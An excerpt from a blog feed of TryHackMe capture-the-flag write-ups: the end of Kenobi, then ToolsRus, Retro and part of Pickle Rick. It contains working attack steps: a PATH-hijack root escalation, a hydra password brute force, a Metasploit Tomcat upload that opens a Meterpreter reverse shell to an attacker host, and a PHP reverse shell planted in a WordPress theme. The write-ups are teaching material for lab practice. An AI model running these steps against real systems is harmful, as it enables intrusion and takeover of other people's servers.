          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:266307 errors:0 dropped:0 overruns:0 frame:0
          TX packets:231976 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:35103632 (35.1 MB)  TX bytes:112553658 (112.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:190 errors:0 dropped:0 overruns:0 frame:0
          TX packets:190 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:14101 (14.1 KB)  TX bytes:14101 (14.1 KB)


kenobi@kenobi:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:/tmp$ echo /bin/bash &amp;gt; curl 
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo &amp;lt;command&amp;gt;".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/tmp# cat /root/
.bash_history  .cache/        root.txt       
.bashrc        .profile       .viminfo       
root@kenobi:/tmp# cat /root/root.txt 
**************************1f02
root@kenobi:/tmp# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;/usr/bin/menu runs as root it does curl server status and kernel version with uname or ifconfig, so i created a curl file and pushed to it a bin bash call gave it permission to be executable and exported the path were the file exists.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/sQL9UPichyoFO" width="480" height="252" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-sQL9UPichyoFO"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
Nmap scan report for ip-10-10-27-83.eu-west-1.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/toolsrus-ctf-write-up/</link><guid isPermaLink="false">5e873c54c0200b446da05df8</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 13:44:52 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;p&gt;Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
Nmap scan report for ip-10-10-27-83.eu-west-1.compute.internal (10.10.27.83)
Host is up (0.0067s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5d:ea:73:8e:0b:06:60:eb:6f:57:dd:99:f8:33:3d:67 (RSA)
|   256 b6:2c:cb:68:c2:ff:d5:3b:5b:ac:4a:66:b5:d8:6d:33 (ECDSA)
|_  256 93:6c:db:4f:5b:2f:a2:83:1f:3d:b0:f6:5f:03:d7:5f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:D0:62:08:8F:98 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have 22 &lt;strong&gt;SSH&lt;/strong&gt;, 80 &lt;strong&gt;HTTP&lt;/strong&gt;, and another &lt;strong&gt;HTTP&lt;/strong&gt; on 1234 running &lt;strong&gt;Tomcat&lt;/strong&gt; and 8009 for &lt;strong&gt;ajp13&lt;/strong&gt; let's have a look what we are dealing with on 80 and check if there's any open directories so we can understand more what we are trying to break&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.44.04.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.27.83

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr  3 13:39:07 2020
URL_BASE: http://10.10.27.83/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.27.83/ ----
==&amp;gt; DIRECTORY: http://10.10.27.83/guidelines/                                      
+ http://10.10.27.83/index.html (CODE:200|SIZE:168)                                
+ http://10.10.27.83/protected (CODE:401|SIZE:458)                                 
+ http://10.10.27.83/server-status (CODE:403|SIZE:299)                             
                                                                                   
---- Entering directory: http://10.10.27.83/guidelines/ ----
+ http://10.10.27.83/guidelines/index.html (CODE:200|SIZE:51)                      
                                                                                   
-----------------
END_TIME: Fri Apr  3 13:39:12 2020
DOWNLOADED: 9224 - FOUND: 4
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.48.35.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.54.50.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and we have a message in directory &lt;strong&gt;/guidelines&lt;/strong&gt; for Mr bob that forgot maybe to update the Tomcat server and another one &lt;strong&gt;/protected&lt;/strong&gt; that tells us that we are visiting the wrong port, that's fine because we have more in port 1234&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.57.36.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.27.83 http-get /protected
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-03 13:53:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.27.83:80/protected
[80][http-get] host: 10.10.27.83   login: bob   password: xxxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-03 13:53:19
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so we know the user and we brute forced the password with hydra let's dig more and see what we can do with our results so far&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-16.46.19.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the version we are on it accepts some code execution and already exist in metasploit which means less work for us, It's all right to be lazy sometimes ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msf5 exploit(multi/http/tomcat_mgr_upload) &amp;gt; show options 

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  xxxxxxx          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.27.83      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.152.253    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) &amp;gt; run

[*] Started reverse TCP handler on 10.10.152.253:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying kDC5cLvVGr0Ljgc6SbP4zI0e0sf...
[*] Executing kDC5cLvVGr0Ljgc6SbP4zI0e0sf...
[*] Undeploying kDC5cLvVGr0Ljgc6SbP4zI0e0sf ...
[*] Sending stage (53906 bytes) to 10.10.27.83
[*] Meterpreter session 1 opened (10.10.152.253:4444 -&amp;gt; 10.10.27.83:47080) at 2020-04-03 14:12:10 +0000

meterpreter &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/oKzYzmKjlPgEU" width="480" height="420" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reactiongifs-oKzYzmKjlPgEU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;and we have a shell, so technically what happened the script logged in went to &lt;strong&gt;/manager &lt;/strong&gt;and uploaded a war file and gave us an easy lazy reverse shell and not any shell a &lt;strong&gt;root&lt;/strong&gt; user shell ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: root
meterpreter &amp;gt; shell
Process 4 created.
Channel 4 created.
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
python -c 'import pty;pty.spawn("/bin/bash")'
root@ip-10-10-27-83:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-27-83:/#&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/WuGSL4LFUMQU" width="480" height="374" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/oooh-WuGSL4LFUMQU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@ip-10-10-27-83:~# ls -la /root
ls -la /root
total 40
drwx------  5 root root 4096 Mar 11  2019 .
drwxr-xr-x 23 root root 4096 Apr  3 13:34 ..
-rw-------  1 root root   47 Mar 11  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root   33 Mar 11  2019 flag.txt
drwxr-xr-x  2 root root 4096 Mar 11  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Mar 10  2019 snap
drwx------  2 root root 4096 Mar 10  2019 .ssh
-rw-------  1 root root  658 Mar 11  2019 .viminfo
root@ip-10-10-27-83:~# cat /root/flag.txt
cat /root/flag.txt
ffxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
root@ip-10-10-27-83:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and here you are a root guru and you got the flag happy with that, but make sure to focus more on the most important part, is to understand why does it work, why exactly when you ran exploit or run in that msfconsole it gave you back a reverse shell, if you are interested on reading more about this exploit, I will leave the ruby file of the exploit used in metasploit and more details on the exploit itself.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/rapid7/metasploit-framework"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;rapid7/metasploit-framework&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Metasploit Framework. Contribute to rapid7/metasploit-framework development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="ToolsRus CTF | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;rapid7&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars3.githubusercontent.com/u/1013671?s=400&amp;amp;v=4" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Apache Tomcat Manager Authenticated Upload Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Rapid7s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.rapid7.com/includes/img/favicon.ico" alt="ToolsRus CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;Rapid7&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.rapid7.com/globalassets/rapid7-og.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.cvedetails.com/cve/CVE-2009-3548/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a blank default password for the administrative user, which allows remote attackers to gain privileges.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.cvedetails.com/img/logo2.png" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Retro | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server based on windows, before we start enumerating the machine we have to take in consideration the note we got, which is we won't get any response for any ping request, nmap does&lt;/p&gt;</description><link>http://localhost:2368/ghostcat-write-up/</link><guid isPermaLink="false">5e87092e8178f03c2e87f649</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 11:01:50 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/HJI.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/HJI.png" alt="Retro | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server based on windows, before we start enumerating the machine we have to take in consideration the note we got, which is we won't get any response for any ping request, nmap does have a flag for that &lt;strong&gt;-nP&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo nmap -Pn -sV -p- -vv &amp;lt;target-machine&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.55.36-1.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;After the quick scan we did on our target, we can see that it is a IIS Windows Server, port 80 is running an http server and we have port 3389 that can allow us to get a remote desktop {RDP} &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.56.26.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.59.08.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.59.36.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;So we visited the port 80, found the landing page of windows server kept digging for directories the only one that is available is &lt;strong&gt;/retro&lt;/strong&gt; or &lt;strong&gt;/Retro&lt;/strong&gt;, it doesn't matter.&lt;/p&gt;&lt;p&gt;the first thing got my eye is the User who shared the article in this site &lt;strong&gt;"Wade"&lt;/strong&gt; I clicked on the user it showed me all the articles shared by the user, it felt like a wordpress but I wanted to make sure that it is! I ran another directory scan in the directory &lt;strong&gt;/retro&lt;/strong&gt; to see if we have anything, but before that, a comment got my eye.&lt;/p&gt;&lt;p&gt;It looks like our user Wade doesn't have a very good memory so he left us a little note in a comment on one of his articles.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.00.38.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.01.50.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just like I thought, it is a wordpress! let's jump to wp-login.php and use the username we have and the note the user left just in case he forgets it, maybe its a bluff or maybe a hint for the password.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.02.35.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;well guess what it is the password for the user, the next part of the logging, I got too excited and forgot to take screenshots, so the step after I created a php reverse shell with &lt;strong&gt;msfvenom&lt;/strong&gt; and went to the theme editor in the dashboard, used the &lt;strong&gt;404.php&lt;/strong&gt; to insert my php code opened metasploit set up my settings and ran the listener and we got a shell &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.04.41.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.09.18.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/IPqbZhStIeZdS" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rainbow-nintendo-mario-IPqbZhStIeZdS"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;Privilege escalation time &lt;/blockquote&gt;&lt;p&gt;It is a windows machine so i ran &lt;strong&gt;&lt;a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"&gt;Windows-Exploit-Suggester&lt;/a&gt; &lt;/strong&gt;made&lt;strong&gt; &lt;/strong&gt;by&lt;strong&gt; &lt;a href="https://github.com/AonCyberLabs"&gt;Aon's Cyber Labs&lt;/a&gt; &lt;/strong&gt;it's a very powerful python script and straight forward so I saved the systeminfo of the machine, ran the command and got all the exploits that can be used for this specific version of window server, in the command I added at the end &lt;strong&gt;-l&lt;/strong&gt; to tell our script to find local exploits, because we want &lt;strong&gt;Administrator&lt;/strong&gt; user&lt;/p&gt;&lt;pre&gt;&lt;code&gt;python windows-exploit-suggester.py --database &amp;lt;xls database  of exploits provided with the script&amp;gt; --systeminfor &amp;lt;systeminfo saved in a txt file&amp;gt; --ostext &amp;lt;Os&amp;gt; -l&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.41.27.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.36.40-1.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Let's use &lt;strong&gt;MS16-075&lt;/strong&gt;, as we can see the bug is considered a medium risk because you need to have access first to the machine and then exploit it if you want to read more about this vulnerability click &lt;strong&gt;&lt;a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-075"&gt;MS16-075&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.43.22.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;metasploit does have the exploit there, all you have to do is use the exploit look at the options, one of the requirements is a session in metasploit that we already have you set the number of the session, run the exploit and we have a shell running NT AUTHORITY\SYSTEM.&lt;/p&gt;&lt;p&gt;That's it for today if you have any question don't be shy getting in touch, and don't forget that what I used is the easy way to exploit this machine, feel free to explore the other ways in.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>Pickle Rick CTF | write-up</title><description>&lt;hr&gt;&lt;p&gt;Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;nmap -sC -sV &lt;strong&gt;&amp;lt;target-machine&amp;gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image"&gt;&lt;/figure&gt;&lt;p&gt;it looks like we don't have much to break, two ports.&lt;/p&gt;</description><link>http://localhost:2368/pickle-rick/</link><guid isPermaLink="false">5e86049fb466e53421ba6f62</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 02 Apr 2020 15:41:21 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/rick_morty.jpg" medium="image"/><content:encoded>&lt;hr&gt;&lt;img src="http://localhost:2368/content/images/2020/04/rick_morty.jpg" alt="Pickle Rick CTF | write-up"&gt;&lt;p&gt;Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;nmap -sC -sV &lt;strong&gt;&amp;lt;target-machine&amp;gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;it looks like we don't have much to break, two ports. 22 for ssh and 80 http, So first what I usually do is give a quick check to the source code of the site in case something is hidden there, and after we have an idea about what we are dealing with, let's check for some directories&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.49-1.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.06.28.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.14.10.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;That is such a weird robots.txt file! it may be something useful for us, so we will keep it aside and it is weird that we have a username without login panel let's nikto the hell of this box&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.06.35.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.07.01.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.15.21.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after finding the login page first what I tried was the famous quote from Rick Wabbalubbadubdub!!!! and we got a command panel that connects us as the user www-data&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/l41lI4bYmcsPJX9Go" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rickandmorty-adult-swim-rick-and-morty-l41lI4bYmcsPJX9Go"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.16.51.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;so when we &lt;strong&gt;ls -la &lt;/strong&gt;we notice that there are two files Sup3rwhatever.txt and clue.txt let's try and open them in the browser.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.31.44.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.32.22.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the first file is our first &lt;strong&gt;flag&lt;/strong&gt;, the second file tells us to look around the system, for my case I tried to get a reverse shell because that command prompt wasn't satisfying, well guess what every time you'll get a reverse one it will shutdown no matter how much you'll try so don't dig hard in that rabbit hole, and the second thing the command panel we have filters the queries and if one of them is &lt;strong&gt;cat&lt;/strong&gt;, &lt;strong&gt;head&lt;/strong&gt;, &lt;strong&gt;tail&lt;/strong&gt;, whatever ... it won't work, lucky us we still have access to &lt;strong&gt;find &lt;/strong&gt;and&lt;strong&gt; less &lt;/strong&gt;that's all we need  after digging in directories with ls -la /stuff/that/linux/have. &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.59.31.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;here we go we have the second ingredients for rick, later when I was trying many commands to find files and try to use any process to access the root directory, I thought about the first thing I try to priv escalate which is 